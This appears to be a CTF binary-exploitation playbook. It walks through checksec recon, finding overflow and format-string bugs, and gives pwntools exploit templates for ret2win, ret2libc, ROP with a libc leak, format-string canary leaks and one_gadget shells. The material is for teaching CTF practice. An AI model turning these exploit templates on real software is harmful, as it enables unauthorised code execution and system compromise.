# Binary Exploitation (Pwn) — bi0s Wiki Methodology

> Source: wiki.bi0s.in/pwn | CTF Pwn Playbook

## Phase 1: Recon

### 1.1 File + Protections
```bash
file ./chal
checksec --file=./chal
```

Interpret `checksec` output:

| Protection | Meaning | Bypass |
|---|---|---|
| **NX disabled** | Stack is executable → inject shellcode | Place shellcode on stack |
| **NX enabled** | Can't execute stack/heap | ROP chains / ret2libc |
| **No Canary** | Stack corruption not detected | Direct overflow |
| **Canary found** | Stack guard present | Leak canary via format string |
| **No PIE** | Binary loaded at fixed address | Use absolute addresses |
| **PIE enabled** | Binary randomized | Leak binary base via info leak |
| **No RELRO** | GOT fully writable | Overwrite GOT entries |
| **Partial RELRO** | GOT writable after resolve | Overwrite GOT after lazy bind |
| **Full RELRO** | GOT read-only after load | Can't overwrite GOT |

### 1.2 Static Analysis
```bash
# List all functions
nm -n ./chal | grep " T "

# Disassemble specific function
objdump -d ./chal | grep -A50 "<vuln\|<main\|<win"

# Interesting PLT imports
objdump -d ./chal | grep "@plt"

# Check for win / backdoor functions
nm ./chal | grep -iE 'win|flag|shell|backdoor|secret'
```

### 1.3 Strings of Interest
```bash
strings ./chal | grep -iE 'flag|/bin/sh|win|correct|wrong|password'
```

---

## Phase 2: Vulnerability Identification

### 2.1 Stack Buffer Overflow
- Look for: `gets()`, `read()` with oversized length, `scanf("%s")`, `strcpy()`
- Confirm with: `pattern_create` in GDB → find offset to RIP/EIP

```bash
# In GDB + pwndbg:
cyclic 200 | ./chal
# Look at RSP/RIP on crash:
cyclic -l 0x6161616f   # → gives offset
```

### 2.2 Format String Vulnerability
- Look for: `printf(buf)` (user input as format string, not `printf("%s", buf)`)
- Test: send `%p.%p.%p.%p` → if you get hex addresses, it's vulnerable

```bash
python3 -c "print('%p.'*20)" | ./chal
# Output leaks: stack addresses, canary, libc addresses
```

### 2.3 Heap Exploitation
- Look for: `malloc/free` with use-after-free, double-free
- Tools: `pwndbg heap` / `pwndbg bins` in GDB

---

## Phase 3: Exploitation Techniques

### 3.1 ret2win (No NX, No PIE)
```python
from pwn import *
io = process('./chal')
win_addr = 0xDEADBEEF  # nm ./chal | grep win
payload = b'A' * OFFSET + p64(win_addr)
io.sendline(payload)
io.interactive()
```

### 3.2 ret2libc (NX enabled, No ASLR)
```python
from pwn import *
elf = ELF('./chal')
libc = ELF('./libc.so.6')
io = process('./chal')

# Gadgets
pop_rdi = next(elf.search(asm('pop rdi; ret')))  # or ROPgadget
ret_gadget = next(elf.search(asm('ret')))

payload  = b'A' * OFFSET
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(ret_gadget)      # stack alignment for Ubuntu
payload += p64(libc.sym['system'])
io.sendline(payload)
io.interactive()
```

### 3.3 ROP + Leak (NX + ASLR + PIE)
```python
from pwn import *
elf = ELF('./chal'); libc = ELF('./libc.so.6')
io = remote('HOST', PORT)

# Step 1: Leak libc address via puts/printf PLT
pop_rdi = elf.address + ROP_OFFSET
payload  = b'A' * OFFSET
payload += p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts'])
payload += p64(elf.sym['main'])  # return to main for second stage
io.sendlineafter(b'> ', payload)

leaked = u64(io.recvuntil(b'\n').strip().ljust(8, b'\x00'))
libc.address = leaked - libc.sym['puts']
log.success(f'libc base: {hex(libc.address)}')

# Step 2: Ret2libc with known libc base
payload2 = b'A' * OFFSET + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system'])
io.sendlineafter(b'> ', payload2)
io.interactive()
```

### 3.4 Format String Exploit
```python
from pwn import *
io = process('./chal')
# Leak canary (usually at stack offset 17-25, vary by binary)
io.sendlineafter(b'>', b'%17$p')
canary = int(io.recvline().strip(), 16)
log.success(f'Canary: {hex(canary)}')

# Overwrite with canary intact
payload = b'A' * 8 + p64(canary) + b'B' * 8 + p64(WIN_ADDR)
```

### 3.5 One_gadget (quickest shell)
```bash
one_gadget libc.so.6
# Gives addresses like: 0xe3b01 execve("/bin/sh", r15, rdx)
# Constraints must be satisfied (check with GDB)
```

---

## Phase 4: Remote Exploitation

```python
from pwn import *
# Always test locally first, then switch to remote:
io = remote('challenge.ctf.io', 9001)
# or: io = process('./chal')

# If the binary is given with libc:
# pwninit --bin ./chal --libc ./libc.so.6  → patches binary RPATH
```

---

## Useful Commands Quick Reference

```bash
# Find offset to RIP
gdb ./chal
(gdb) cyclic 200 | run
(gdb) cyclic -l $rsp  # or $eip for 32-bit

# Find ROP gadgets
ROPgadget --binary ./chal | grep "pop rdi"
ropper -f ./chal --search "pop rdi"

# Identify libc version from leak
# → https://libc.rip (paste leaked puts address → get libc)
# → /opt/libc-database/find puts LEAKED_OFFSET

# Patch binary to use local libc
pwninit --bin ./chal --libc ./libc.so.6

# Disable ASLR for local testing
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
